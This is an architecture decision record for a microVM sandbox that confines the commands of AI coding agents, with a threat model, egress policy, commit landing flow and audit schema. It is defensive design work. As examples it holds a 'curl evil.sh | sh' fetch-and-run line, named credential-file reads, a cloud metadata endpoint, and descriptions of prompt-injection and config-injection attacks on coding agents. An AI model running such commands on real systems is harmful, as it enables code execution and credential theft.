# ADR-005: MicroVM Sandbox for Agent Execution (mgit sandbox)

**Status:** Accepted
**Date:** 2026-06-12
**Refs:** FR-17 / NFR-17 (REQUIREMENTS.md), FR-16 (Agent Worktrees), ADR-002 (Dual-Hash Model), ADR-003 (DO-178C Scope — sandbox tool-qualification section), ADR-004 (Pluggable Worktree)

---

## Context

LLM coding agents need to build, test, and install dependencies as part of normal work. Today that means executing untrusted third-party code (npm postinstall scripts, Go module build tags, pip setup.py, make targets) directly on the user's machine, which forces a bad trade-off:

- **Permission prompts everywhere** — the agent loop stalls on human approval for every shell command, defeating autonomous operation.
- **Or unrestricted execution** — a single malicious transitive dependency can read SSH keys and cloud credentials, exfiltrate source, or persist malware on the host.

A "chroot jail" was the original framing, but chroot is explicitly **not** a security boundary: it shares the host kernel, is escapable by root, filters no syscalls, and does not exist on macOS or Windows. OS containers (Docker/Podman) improve on this but still share the host kernel — a single kernel vulnerability is a sandbox escape. The current industry consensus for running untrusted/AI-generated code is hardware-virtualized microVMs (Firecracker, libkrun, Apple Virtualization.framework), which boot in ~100–200 ms with single-digit-MB overhead.

mgit already has the primitive this design needs: **task-bound worktrees** (FR-16, ADR-004). Every unit of agent work is a worktree bound to exactly one task ID, with branch and task exclusivity enforced. The sandbox extends that binding by one level: **one task → one worktree → one microVM**.

### Threat Model

| # | Threat | Example |
|---|--------|---------|
| T1 | Supply-chain code execution | npm postinstall script drops a payload during `npm install` |
| T2 | Host filesystem damage/access | Build script reads `~/.ssh`, `~/.aws`, or deletes user files |
| T3 | Secret exfiltration | Malware ships env vars or source code to an external host |
| T4 | Persistence | Cron job, shell rc edit, or LaunchAgent installed on host |
| T5 | History/audit tampering | Compromised toolchain rewrites commits to hide its tracks |
| T6 | Cross-task contamination | One task's compromised sandbox alters another task's worktree |
| T7 | Resource abuse | Cryptominer or fork bomb consumes the host |
| T8 | Config injection via shared worktree | Guest writes files the host auto-executes/auto-trusts: `.claude/settings.json` (hooks run host-side), `.envrc`, `.git/hooks/`, `.vscode/tasks.json`, generated CLAUDE.md — escaping via the agent harness |
| T9 | Lateral movement / metadata theft | Sandboxed code reaches LAN services, router admin, or cloud metadata endpoints (`169.254.169.254`) to steal instance credentials |

### Goals

1. Agents run **without per-command permission prompts** inside the sandbox.
2. Host OS and filesystem are unreachable from sandboxed code (T1–T4).
3. Platform agnostic: macOS, Linux, Windows, one CLI surface.
4. Network policy is **configurable per sandbox**: `open`, `none`, or `allowlist` (egress proxy).
5. Full provenance: every commit records which sandbox produced it; sandbox lifecycle is append-only audited (T5).
6. Disposable: destroying a sandbox cannot lose committed work and cannot leave host residue.
7. **Seamless**: sandboxes are created, entered, landed, and destroyed automatically by the task lifecycle. No explicit sandbox commands required in the happy path; no user intervention.
8. **Lightweight**: near-zero footprint when idle; warm-start under 200 ms; memory reclaimed from idle guests. The user should not notice sandboxes exist.

### Non-Goals

- Defending against hypervisor (KVM/Hypervisor.framework/Hyper-V) 0-days.
- GUI application sandboxing. Scope is headless build/test/run for coding agents.
- Multi-tenant cloud isolation (single-developer-machine model; multi-agent, single trust domain).

---

## Decision

Implement **`mgit sandbox`**: a pluggable `SandboxManager` interface (mirroring `WorktreeManager` from ADR-004) whose v1 backends are **native microVMs on each platform**, with the task-bound worktree as the only writable filesystem shared into the guest.

```
┌────────────────────────── Host ──────────────────────────┐
│  mgit CLI / MCP / REST                                    │
│        │                                                  │
│  SandboxService ──── WorktreeService                      │
│        │                     │                            │
│  SandboxManager (iface)   WorktreeManager (iface)         │
│        │                     │                            │
│  ┌─────▼──────────┐   .mgit/worktrees/<name>/             │
│  │ backend:        │         │                            │
│  │  kvm (Linux)    │   ┌─────▼─────────────────────────┐  │
│  │  vzf (macOS)    │   │ worktrees/MGIT-4.2/  (virtiofs)│──┼── only writable mount
│  │  hyperv (Win)   │   └───────────────────────────────┘  │
│  └─────┬──────────┘                                       │
│        │ vsock (control plane, no TCP)                    │
│  ┌─────▼─────────── microVM guest ────────────────────┐   │
│  │ pinned rootfs image (read-only, digest-verified)    │  │
│  │ COW overlay for /, tmpfs for /tmp                   │  │
│  │ guest agent (PID 1 supervisor) + toolchains         │  │
│  │ /work  ← the task worktree                          │  │
│  └────────────────────────────────────────────────────┘   │
│        │ egress (policy: open | none | allowlist proxy)   │
└──────────────────────────────────────────────────────────┘
```

### Binding Rules (extends FR-16)

1. Every sandbox is bound to exactly one task and exactly one worktree (`mgit sandbox add --task <ID>` creates both).
2. No two sandboxes share a worktree, branch, or task ID (reuses FR-16 exclusivity; `ErrTaskAlreadyBound` applies).
3. Commits made inside the sandbox auto-inherit the bound task ID, exactly as in a host worktree.
4. The guest sees **only** the worktree at `/work`. The parent repository, `.mgit/objects/`, host `$HOME`, and host env vars are never mounted or forwarded.

### Quarantine-then-Land Commit Flow

The sandbox holds a **private object store**; the host repository is never directly writable from the guest (T5, T6).

```
agent (in guest): edit → mgit commit  (micro-commits accumulate in sandbox-local store)
host:             mgit sandbox land --task MGIT-4.2
                    1. pull commit objects over vsock
                    2. verify dual hash per ADR-002 (recompute SHA-1 + SHA-256)
                    3. verify task ID binding on every commit (ErrTaskMismatch)
                    4. append to task_commits (append-only, as always)
                    5. fast-forward the task branch; never rewrite
```

`land` is atomic: all commits verify and import, or none do (same all-or-nothing semantics as squash, FR-2.x). Rollback of an abandoned sandbox is `mgit sandbox remove` — committed-and-landed work is untouched; unlanded work is discarded by design.

**Commit attestation (`require_sandbox`) — host-anchored.** Routing is cooperative for some harnesses, so containment could be silently absent. To make unsandboxed work a *blocked* state rather than a silent gap, each commit carries an attestation — but the attestation is issued **host-side**, not by the guest. The guest is the threat actor; an attestation signed by `mgit-guest` (which a compromised guest owns) would be forgeable and worthless (see AUDIT-FR17-SANDBOX-SECURITY-V1 SEC-01). Instead, `mgit-sandboxd` on the host observes each commit as its objects cross vsock and issues the attestation itself, keyed by host-held material the guest never sees. `mgit-guest` is pure transport — it holds no signing key and cannot mint attestations. With `require_sandbox = true` (default in safety-critical profiles), `land` refuses any commit lacking a valid host-issued attestation (`ErrUnattestedCommit`). Commits landed without attestation (policy off) carry `sandbox_id = NULL`, permanently visible in the audit trail.

**Land-path hardening.** The guest is the hostile party in this design — it is the thing that ran the npm malware. The vsock land protocol is schema-validated with size and object-count ceilings (zip-bomb class), tree-entry paths are canonicalized and traversal-rejected, and all guest-sourced strings are sanitized and length-capped before entering append-only audit tables (where corrupted entries would be permanent). Verification hashes the **exact buffer that is imported** (hash-on-write, single read) — never a separate fetch — to close the verify-then-import TOCTOU (SEC-06). Guest-supplied author/timestamp are advisory; the host records its own receive-time.

**Private object store (quarantine vs. ADR-004 sharing).** ADR-004 shares `.mgit/objects/` and `.mgit/refs/` across host worktrees. The sandbox must **not** inherit that: the guest mount is the working-tree files only, and the guest's `.git` is rebound to a **private, sandbox-local object store**. The host shared store, index DB, refs, and parent `.mgit` are never resolvable from inside the guest (SEC-03) — otherwise the guest would read other tasks' objects and write the shared store directly, bypassing the verified land door. Land is the only path from private store to shared store.

### Per-Sandbox Network Policy

Declared at launch, recorded immutably in the audit record, enforced **on the host side** (the guest cannot weaken it):

| Mode | Mechanism | Use case |
|------|-----------|----------|
| `none` | No NIC attached to the VM; vsock control plane only | Pure refactoring/test tasks; maximum safety |
| `allowlist` | No direct route; host proxy permits only flows whose **resolved destination IP** is on the allowlist | Default. Package registries (`registry.npmjs.org`, `proxy.golang.org`, `pypi.org`) plus per-project additions |
| `open` | NAT to host network. **Explicitly disables T3 (exfiltration) and T9 (lateral movement)** — user-accepted risk, never a default | Opt-in; tasks needing arbitrary network |

**Egress enforced at the IP/flow layer, not SNI parsing (SEC-04).** Host/SNI allowlisting is defeatable in 2026 by Encrypted ClientHello, domain fronting, raw-IP connections, QUIC, and DNS tunnelling. So `allowlist` mode instead: gives the guest no direct route; resolves DNS host-side and only for allowlisted names (IP-pinned); permits TCP only to allowlisted resolved IPs; drops all UDP except DNS to the host resolver; blocks QUIC; treats ECH/unresolvable SNI as deny; **unconditionally denies RFC1918, link-local, and metadata IPs** (`169.254.169.254` etc.); and rate-limits + logs DNS to throttle label-encoding exfiltration. Every allow/deny is written to the audit log.

**Policy is host-only state, never in the worktree (SEC-02).** Enforcement inputs — network policy, `require_sandbox`, image lock, sensitive-path list, resource caps — live under a host config root (`~/.mgit/host/<repo-id>/`), are never mounted into guests, and are **not committable repo files**. Otherwise the guest (or an agent it manipulates) edits the policy to set `require_sandbox=false` or `open` network, lands it, and weakens every subsequent task. A repo may ship *suggested* defaults that take effect only after explicit host-side adoption; the effective policy is recorded in the audit log.

### CLI Surface

```
mgit sandbox add    --task MGIT-4.2 [--net allowlist|none|open] [--image go-node:1.0]
                    [--cpus 4] [--mem 4096] [--ttl 4h] [path]
mgit sandbox list
mgit sandbox exec   <id|task> -- go test ./...
mgit sandbox shell  <id|task>
mgit sandbox land   <id|task> [--squash]
mgit sandbox stop   <id|task> [--force]
mgit sandbox remove <id|task> [--force]     # refuses if unlanded commits, unless --force
mgit sandbox prune  [--dry-run]
```

Familiar worktree-style verbs so agents trained on git/mgit semantics need no new mental model.

**These commands are escape hatches, not the workflow.** The happy path is fully automatic (below).

### Zero-Touch Lifecycle (Seamless by Default)

The sandbox is implied by the task — no human or agent ever has to ask for one:

```
mtix_claim MGIT-4.2          → worktree created + sandbox provisioned (lazily)
agent runs any command       → transparently executed inside the bound sandbox
agent runs mgit commit       → micro-commit lands in the sandbox-local store
mtix_done MGIT-4.2           → auto-land (verify + import), then auto-teardown
```

Mechanics:

1. **Lazy provision.** Claiming a task registers the sandbox; the VM does not boot until the first command needs it. Tasks that never execute anything cost nothing.
2. **Transparent exec routing.** Inside a bound worktree, a lightweight shim (shell PATH shim or `mgit run` as the agent's default executor) routes every command into the guest over vsock. The agent does not know or care that it is sandboxed — stdout/stderr/exit codes are passed through unchanged, `/work` paths mirror the worktree paths.
3. **Policy from config, not prompts.** Defaults come from the host config root (`~/.mgit/host/<repo-id>/policy.json`, per SEC-02 / FR-17.13 — never a worktree file): default network mode (`allowlist`), default image, default caps. Per-task overrides via task metadata. Nothing ever blocks on a question.
4. **Auto-land on done.** `mtix_done` triggers `sandbox land`; verification failure blocks the done transition (honest-blocked over dishonest-done, per CLAUDE.md rule 11) — the only point where a human is pulled in, and only on integrity failure.
5. **Auto-teardown.** Landed sandboxes are destroyed immediately; abandoned ones are reaped by TTL and `prune`. Worktree removal removes the sandbox.

### Agent Integration Model (Claude Code, Codex, Cursor, …)

The driving agent is **not** re-run inside the sandbox. Two topologies:

**T1 — Host brain, guest hands (default).** The agent harness (Claude Code, Codex CLI, Cursor) runs on the host exactly as the user launched it. Only *execution* is confined:

```
user ── claude (host) ── mtix_claim ──► worktree + sandbox registered (lazy)
              │
              ├─ Read/Edit/Write ──► worktree files (host side of virtiofs mount)
              │                          │ visible instantly in guest at /work
              └─ Bash tool ──► PATH shim / PreToolUse hook ──► mgit run -- <cmd>
                                                │ vsock
                                          microVM guest (first cmd warm-starts VM)
              ◄── stdout/stderr/exit code passthrough ──┘
              │
              └─ mtix_done ──► auto-land (verify) ──► teardown
```

- **Routing is injected, not vendor-integrated.** `mgit worktree add` writes per-agent activation into the worktree: `.claude/settings.json` PreToolUse hook (Claude Code), `AGENTS.md` directive (Codex), rules file (Cursor), plus a generic PATH shim + direnv for anything else. Any harness that edits files and runs shell commands works unmodified.
- **File edits stay host-side** on the shared worktree mount — no latency, no agent changes. Command execution (builds, tests, installs — where third-party code actually runs) happens in the guest.
- **Permission model:** Bash auto-approve becomes safe because Bash is confined. The harness's own host-side tools (web fetch, file I/O) remain governed by the harness's project-scoping — T1 confines the *code the agent runs*, not the agent process itself.
- Long-running processes (dev servers) get vsock→localhost port forwarding; interactive TTYs are proxied.

**T2 — Fully confined agent (hardened, opt-in).** For high-risk tasks: the guest image bundles the agent CLI, credentials are injected per-session (never baked into the image, flagged in audit), and the user attaches via `mgit sandbox shell`. Confines the agent process itself at the cost of session/MCP-config friction. Per-task opt-in: `sandbox.confine_agent = true`.

Precedent for T1: Dagger's container-use ships host-agent/sandboxed-exec today (container-based); Cursor 2.x sandboxes exec per-worktree on macOS. The microVM boundary and verified land path are the deltas.

### Command Routing Mechanics (Claude Code reference adapter)

The harness needs no code changes; `mgit worktree add` writes two things into the worktree:

1. **`.claude/settings.json`** — a `PreToolUse` hook on the Bash tool. Per the Claude Code hooks API, the hook returns `hookSpecificOutput.permissionDecision: "allow"` (suppressing the permission prompt) and `updatedInput` rewriting the command to `mgit run -- bash -lc '<original>'`. **Fail-closed:** the hook first health-checks the sandbox (`mgit sandbox status`); if the VM is unavailable it returns `"ask"`, restoring normal prompting. User-defined deny rules override hook approvals (harness-guaranteed) — respected by design.
2. **CLAUDE.md section (knowledge layer)** — generated environment facts: commands run in a microVM; the worktree is mounted at the identical path; network mode and allowlist; "run commands freely, no approval needed"; how to interpret and remedy `MGIT-EGRESS-DENIED` errors.

**Identical-path mount:** the guest mounts the worktree at the same absolute path as on the host. cwd, globs, and absolute paths inside commands work unmodified — no path translation layer to get wrong.

Whole-command routing (one guest shell per Bash invocation) means pipelines, globs, subshells, and `&&` chains behave exactly as locally — there is no per-binary shimming and therefore no command classifier to have bypass bugs.

Adapters for other harnesses: Codex (`AGENTS.md` directive + PATH shim), Cursor (rules file + shim). These are cooperative, not enforced — acceptable for T1 (the threat is third-party code, not the harness); T2 exists for stronger assumptions.

### Worked Examples

**Simple — `grep` (read-only, happy path):**

```
Claude Code Bash tool:  grep -rn "ErrSquashFailed" internal/
 1. PreToolUse hook fires (matcher: Bash)
 2. Hook: mgit sandbox status --task MGIT-4.2  → healthy
 3. Hook returns: permissionDecision="allow" (no user prompt),
    updatedInput.command = mgit run -- bash -lc 'grep -rn "ErrSquashFailed" internal/'
 4. mgit run: resolves sandbox from cwd → vsock exec; VM already warm (or
    snapshot-restores in <200 ms); cwd preserved (identical-path mount)
 5. grep runs in guest against /work == worktree; stdout/exit code stream back
Claude Code sees: normal grep output, exit 0, ~50 ms slower. Nothing else.
```

**Medium — `sed`/`awk` (writes + pipeline):**

```
Claude Code Bash tool:  sed -i 's/logrus/slog/g' internal/store/*.go
 1–4. Same hook flow; whole command line becomes one guest shell
 5. Glob expands INSIDE the guest (same paths, same files); sed writes
    in-place → virtiofs → host worktree updated instantly
 6. Claude Code's next Read/Edit tool call (host-side) sees the new content
Pipelines behave identically — one guest shell runs the whole thing:
    awk '/FAIL/{c++} END{print c}' test.log | sort | uniq -c
No per-binary shimming → no pipeline splitting, no classifier to bypass.
```

**Complex — `ssh` to another host (boundary-crossing, capability escalation):**

```
Claude Code Bash tool:  ssh deploy@staging.corp 'systemctl restart app'
 1–4. Same hook flow → runs in guest
 5. Gate 1: egress proxy — staging.corp:22 not in allowlist → connection refused
 6. Gate 2 (had egress passed): no SSH keys exist in the guest
 7. Command fails fast with a machine-readable error:
      MGIT-EGRESS-DENIED host=staging.corp:22
      remedy: mgit sandbox policy request --egress staging.corp:22 --forward-ssh-agent
 8. Claude Code (instructed by the generated CLAUDE.md section) runs the remedy
 9. Host shows ONE prompt to the user:
      "Task MGIT-4.2 sandbox requests: ssh to staging.corp:22 + ssh-agent
       forwarding. Allow for this sandbox's lifetime? [y/N]"
10. On approval: grant recorded append-only in audit log; proxy opens
    staging.corp:22; host ssh-agent socket proxied into guest over vsock
11. Claude Code retries the ssh command → succeeds. Signing happens host-side;
    private keys never enter the guest. Grant dies with the sandbox.
```

Quick reference for other cases:

| Agent command | Behavior |
|---|---|
| `npm install` | Postinstall scripts detonate inside VM (T1 contained); registry reachable via allowlist proxy |
| `sudo apt-get install -y protoc` / `docker build` | Root and nested containers inside the guest's own kernel — safe to allow, previously impossible to grant |
| `npm run dev` (port 3000) | Guest port auto-forwarded over vsock to host `localhost:3000` |
| `curl evil.sh \| sh` | Egress denied by proxy; fast structured failure |
| sandbox VM down/crashed | Hook health check fails → `permissionDecision="ask"` → normal permission prompts resume (fail-closed) |

### Capability Escalation (per-capability, not per-command)

Boundary-crossing capabilities (extra egress hosts, `open` network, ssh-agent forwarding, additional mounts) are requested explicitly — `mgit sandbox policy request --egress staging:22 --forward-ssh-agent` (CLI + MCP tool) — producing **one** host-side user prompt per capability per sandbox lifetime. Grants are recorded append-only in the audit log and die with the sandbox. ssh-agent forwarding proxies the host agent socket over vsock: sandboxed code can request signatures but private keys never enter the guest.

Denial errors are machine-readable (`MGIT-EGRESS-DENIED host=... remedy=...`) so agents self-correct instead of misdiagnosing network failures. The permission model thus collapses from per-command prompting to a handful of audited capability decisions.

### Resource Budget (Lightweight by Design)

| Mechanism | Effect |
|-----------|--------|
| Shared read-only rootfs + per-VM COW overlay | One base image on disk regardless of sandbox count; per-sandbox disk ≈ packages it installs |
| Snapshot/restore warm pool (one pre-booted, pre-snapshot guest per image) | Warm start < 200 ms; cold boot < 1 s |
| Idle suspend | VM paused after N idle minutes (default 5): 0% CPU, memory snapshot optionally swapped to disk |
| Memory ballooning + free-page reporting | Guest returns unused pages to host; idle resident target ≤ 100 MB per active VM |
| Default caps | 2 vCPU (shared, not pinned), 2 GB ballooned, 4 GB disk quota — overridable per task |
| On-demand daemon | `mgit-sandboxd` is socket-activated; exits when no sandboxes exist. Zero footprint when mgit is not in use |

Performance acceptance criteria are codified in NFR-17 and benchmarked in MGIT-11.13.2: warm exec round-trip overhead < 50 ms vs host execution; suspended sandbox CPU = 0; host with 5 idle sandboxes shows < 500 MB total attributable RSS.

### Interface Contract

```go
// SandboxManager abstracts microVM lifecycle per platform backend.
// Mirrors WorktreeManager (ADR-004). Refs: FR-17.
type SandboxManager interface {
    Launch(ctx context.Context, opts SandboxLaunchOptions) (*SandboxInfo, error)
    List(ctx context.Context) ([]SandboxInfo, error)
    Exec(ctx context.Context, id string, req ExecRequest) (*ExecResult, error)
    Stop(ctx context.Context, id string, force bool) error
    Remove(ctx context.Context, id string, force bool) error
    Resolve(ctx context.Context, id string) (*SandboxInfo, error)
}

type SandboxLaunchOptions struct {
    TaskID       string        `json:"task_id"`
    WorktreePath string        `json:"worktree_path"`
    ImageRef     string        `json:"image_ref"`     // pinned by digest
    Network      NetworkPolicy `json:"network"`
    CPUs         int           `json:"cpus"`
    MemoryMB     int           `json:"memory_mb"`
    DiskQuotaMB  int           `json:"disk_quota_mb"`
    TTL          time.Duration `json:"ttl"`
}

type NetworkPolicy struct {
    Mode      string   `json:"mode"`                // "none" | "allowlist" | "open"
    Allowlist []string `json:"allowlist,omitempty"` // host patterns, allowlist mode only
}
```

New sentinel errors in `model/errors.go`:

```go
var (
    ErrSandboxNotFound      = errors.New("sandbox not found")
    ErrSandboxBackendUnavailable = errors.New("no sandbox backend available on this platform")
    ErrLandVerificationFailed    = errors.New("sandbox land: commit verification failed")
    ErrUnlandedCommits      = errors.New("sandbox has unlanded commits")
    ErrNetworkPolicyViolation    = errors.New("network policy violation")
    ErrUnattestedCommit     = errors.New("commit lacks sandbox attestation")
    ErrSensitivePathModified     = errors.New("guest modified a protected host-trusted path")
)
```

### Platform Backends (v1)

| Platform | Hypervisor | Candidate mechanism | Notes |
|----------|-----------|---------------------|-------|
| Linux | KVM | libkrun or Firecracker-class VMM | ~125 ms boot, rust-vmm lineage, battle-tested (AWS Lambda, E2B) |
| macOS | Virtualization.framework | vz bindings (Apple-silicon & Intel) | Native, no kext; same approach as Apple's containerization tooling |
| Windows | Hyper-V / WHP | WSL2 utility-VM or WHP-based VMM | Hyper-V platform required; document fallback |
| Fallback | none | OS container (rootless Podman/Docker) | **Reduced assurance**; permitted only with explicit `--backend container --acknowledge-reduced-isolation`, recorded in audit |

**CGO containment:** macOS vz bindings (and possibly others) require CGO, which conflicts with mgit's pure-Go, CGO-free policy. Resolution: platform backends live in a separate `mgit-sandboxd` helper binary spoken to over local IPC. Core `mgit` stays CGO-free; the helper is per-platform and independently auditable. All new dependencies go through PACKAGE-APPROVAL-PROCESS.md before any code is written.

### Guest Image Discipline

- Rootfs images are **content-addressed and digest-pinned** in the host-side `images.lock` under `~/.mgit/host/<repo-id>/` (SEC-02 / FR-17.13, FR-17.36; same supply-chain posture as APPROVED-PACKAGES.md).
- Images are read-only; the guest gets a copy-on-write overlay discarded at teardown.
- A minimal `mgit-guest` agent is PID 1: supervises exec requests over vsock, enforces no-host-env, reports resource usage.
- No secrets baked into images; no host env passthrough. Credentials a task legitimately needs (e.g., a registry token) are injected explicitly per-exec and flagged in audit.

### Audit Trail (extends FR-5.x)

New **event-sourced**, append-only table, same laws as `task_commits` (no UPDATE, no DELETE, ever — a session-row design with mutable `ended_at` would violate SQL Rule 5; see AUDIT-FR17-SANDBOX-V1 F-01):

```sql
CREATE TABLE sandbox_events (
    id            TEXT PRIMARY KEY,   -- ULID (sortable: event order)
    sandbox_id    TEXT NOT NULL,      -- ULID of the sandbox
    task_id       TEXT NOT NULL,
    event_type    TEXT NOT NULL,      -- created | suspended | resumed |
                                      -- policy_granted | landed | destroyed |
                                      -- ttl_expired | killed
    backend       TEXT,               -- kvm | vzf | hyperv | container (created event)
    image_digest  TEXT,               -- sha256 of rootfs image (created event)
    network_mode  TEXT,               -- none | allowlist | open (created/policy events)
    detail        TEXT,               -- JSON; guest-sourced strings sanitized + length-capped
    created_at    TEXT NOT NULL       -- ISO-8601 UTC
);
```

Session state is **derived** from the latest event per `sandbox_id`; lifecycle transitions append, never mutate.

`task_commits` gains a nullable `sandbox_id` column (append-time only): every landed commit is traceable to the exact sandbox, image digest, and network policy under which it was produced. Egress decisions in allowlist mode append to `sandbox_egress_log`. This makes the sandbox a **provenance strengthener** for DO-178C/IEC 62304 arguments, not just a safety fence: auditors can show each change was produced in a known environment with a known network posture.

### Threat Coverage

| Threat | Mitigation |
|--------|-----------|
| T1 supply chain exec | Code runs only in guest; hardware VM boundary; host untouched |
| T2 host FS access | Only `/work` (the worktree) is shared; no $HOME, no parent repo |
| T3 exfiltration | `none`/`allowlist` modes; host-enforced proxy; egress log |
| T4 persistence | Guest is ephemeral COW; teardown discards everything but the worktree |
| T5 audit tampering | Quarantine-then-land with dual-hash verification; append-only tables |
| T6 cross-task contamination | One VM per task/worktree; no shared writable mounts between sandboxes |
| T7 resource abuse | CPU/mem/disk caps and TTL per VM, enforced by the VMM |
| T8 config injection | Host-auto-executed paths (`.claude/**`, `.envrc`, `.git/hooks/**`, `.vscode/**`, agent rules files — configurable list) are mounted **read-only** into the guest; `land` flags/refuses guest modifications to the sensitive-path list (`ErrSensitivePathModified`) |
| T9 lateral movement | Egress proxy denies RFC1918, link-local, and metadata endpoints by default in `allowlist` mode; DNS resolved host-side (no tunneling); LAN/metadata access requires an explicit, audited capability grant |

### Residual Risk — What This Feature Does NOT Mitigate

Stated explicitly so the boundary is never oversold:

1. **Malicious or incorrect code entering the product.** `land` verifies provenance and integrity, **not benignity**. A subtle backdoor that is committed and landed ships. Defenses are review, tests, and static analysis — the sandbox contributes perfect attribution (which sandbox, image, network produced it), not prevention.
2. **Prompt injection against the agent** is bounded, not stopped: command consequences are contained and exfiltration is policy-limited, but the model can still be steered into writing bad code or misusing its host-side tools.
3. **Compromise of the agent harness itself** (malicious plugin/MCP server) runs on the host in T1 topology. T2 (fully confined agent) exists for this; the harness's own sandboxing governs its host-side tools (web fetch, file I/O).
4. **Bugs in the boundary**: VMM, virtiofs, vsock, `mgit-sandboxd`. Hypervisor 0-days are out of scope (Non-Goals); the device/protocol surface is why land-path hardening and fault-injection tests are adoption criteria.
5. **Granted capabilities are real risk while granted**: a forwarded ssh-agent can sign for sandboxed code during the grant lifetime; an `open`-network sandbox can exfiltrate. Grants are deliberate, scoped, prompted, and audited — but they are the user accepting risk, and grant prompts must always display destination + requesting task (no "allow all" option) to limit the social-engineering surface.
6. **Covert channels through allowlisted hosts** (encoding data into registry queries) and CPU side channels (Spectre-class) — narrowed by minimal allowlists and per-task VMs; not eliminated.
7. **Vulnerable-but-honest code, license contamination, upstream-poisoned base images** beyond what digest pinning/signing detects.

---

## Rationale

### Why microVM and not chroot/containers?

- chroot: not a security boundary, root-escapable, shared kernel, Linux/macOS semantics diverge, nothing on Windows.
- Containers: shared host kernel = single kernel bug from escape; namespaces differ per OS; Docker Desktop on macOS/Windows is itself a VM anyway — so take the VM boundary directly and drop the daemon dependency.
- MicroVMs: hardware isolation, ~100–200 ms boot and MB-scale overhead make per-task VMs practical, and every target OS ships a native hypervisor (KVM, Virtualization.framework, Hyper-V). This is the same conclusion the broader agent-sandboxing ecosystem reached in 2025–26 (Firecracker/E2B, libkrun/microsandbox, Apple containerization).

### Why bind sandbox ⇄ worktree ⇄ task?

mgit's whole value is task-level provenance. FR-16 already enforces one-task-one-worktree; making the VM coextensive with the worktree means isolation, traceability, and rollback all share one unit of granularity. `sandbox remove` is the rollback; `sandbox land` is the only door into the repository, and it is a verifying, append-only door.

### Why quarantine-then-land instead of mounting the repo?

If the guest could write `.mgit/objects/` directly, a compromised toolchain inside the VM could corrupt or rewrite history (T5) — the strongest mgit guarantee would be hostage to the weakest npm package. Landing on the host with dual-hash re-verification keeps the trust boundary at the host process, where it already is for squash and rollback.

### Why pluggable (again)?

Same logic as ADR-004: hypervisor APIs and the microVM ecosystem are evolving quickly (go-git v6, libkrun, Apple containerization are all young). The interface keeps CLI/MCP/service layers stable while backends mature or get swapped.

---

## Consequences

### Positive
- Agents work autonomously — no permission prompts — without exposing the host (the sandbox **is** the permission).
- Zero workflow change: the task lifecycle (`mtix_claim` → work → `mtix_done`) drives sandbox provision, exec routing, landing, and teardown automatically.
- Supply-chain blast radius confined to a disposable VM; worst case costs a `sandbox remove`.
- Strengthened compliance story: per-commit environment provenance (image digest + network posture).
- One CLI across macOS/Linux/Windows.

### Negative
- Three platform backends to build and test; significant v1 scope (epic MGIT-11, stages MGIT-11.2–11.13).
- Guest images to curate, pin, and update (new supply-chain surface, mitigated by digest pinning).
- `mgit-sandboxd` helper binary breaks the single-binary distribution story on platforms needing CGO.
- microVM startup and virtiofs I/O overhead vs. raw host execution (target: <500 ms add-to-prompt per NFR-17.2, benchmark in MGIT-11.13.2).
- Requires virtualization available/enabled (nested-virt CI runners, corporate Hyper-V policies) — hence the explicitly-acknowledged container fallback.

## Adoption Criteria (dispositioned at acceptance, 2026-06-12)

| # | Criterion | Disposition |
|---|-----------|-------------|
| 1 | FR-17 requirements in REQUIREMENTS.md with numbered acceptance criteria | **Met** — FR-17.1–17.37, NFR-17.1–17.7 (MGIT-11.1.1, MGIT-11.1.2) |
| 2 | Backend dependency proposals approved | **Met** — APPROVED-PACKAGES.md §2a + `pkg-approvals/approved/` (MGIT-11.1.4) |
| 3 | Cross-platform latency/throughput spike | **Converted to requirement** — NFR-17.1–17.2 gates; benchmarked in MGIT-11.13.2 before any backend ships |
| 4 | Land-path security review vs OWASP ASVS L2 | **Converted to requirement** — security audit V2 + land-parser fuzzing in MGIT-11.13.3, gated on FR-17.35 protocol spec |
| 5 | DO-330 tool-qualification position (F-04) | **Met** — FR-17.30; ADR-003 "Sandbox Components" section |
| 6 | SANDBOX-IMAGES.md SOUP/COTS register (F-05) | **Converted to requirement** — FR-17.31; produced in MGIT-11.12.2 |
| 7 | Independent re-verification mode (F-06) | **Converted to requirement** — FR-17.32; implemented in MGIT-11.12.1 |
| 8 | Fault-injection test categories (F-07) | **Met (specified)** — FR-17.33 enumerates the six categories; suite built in MGIT-11.12.3 |
| 9 | sandboxd IPC authentication spec (F-08) | **Met (specified)** — FR-17.34; implemented in MGIT-11.4.2 |
| 10 | vsock IDD; image signing; images.lock change control (F-09..F-12) | **Met (specified)** — FR-17.35, FR-17.29, FR-17.36; IDD authored in MGIT-11.8.2 before backend code |
| 11 | SEC-05/08/09/10/12 hardening clauses | **Met (specified)** — FR-17.12, FR-17.25, FR-17.26, FR-17.27, FR-17.29 |

Acceptance rationale: criteria 1–2 are fully met; every remaining criterion is
now a **binding numbered requirement** with an owning task in epic MGIT-11, so
the gate conditions are enforced by the RTM and the story-closure review rather
than by this ADR's status. Items 3 and 4 remain hard gates on *shipping*
(MGIT-11.13), not on accepting the design.

Standards audit: AUDIT-FR17-SANDBOX-V1.md (3 P1 remediated). Security audit: AUDIT-FR17-SANDBOX-SECURITY-V1.md (4 Critical remediated in this revision; 5 High / 3 Medium encoded as FR-17 clauses). Security audit V2 (post-protocol-spec) must fuzz the land parser (MGIT-11.13.3).

## Revision History

| Date | Change |
|------|--------|
| 2026-06-12 | Initial proposal; P1/Critical remediations from AUDIT-FR17-SANDBOX-V1 (F-01..F-03) and AUDIT-FR17-SANDBOX-SECURITY-V1 (SEC-01..SEC-04) applied in-cycle |
| 2026-06-12 | **Promoted Proposed → Accepted** (MGIT-11.1.3): criteria 1–2 met (FR-17/NFR-17 drafted; backend packages approved), criteria 3–11 encoded as binding FR-17/NFR-17 clauses with owning MGIT-11 tasks. Corrections in the same revision: stale task references from the pre-import MGIT-9 numbering rewritten to MGIT-11.x (the sandbox epic was imported into mtix as MGIT-11; MGIT-9 is the unrelated coverage sprint); policy.json and images.lock paths moved out of `.mgit/sandbox/` (worktree-resident, contradicted SEC-02) to the host config root per FR-17.13 |
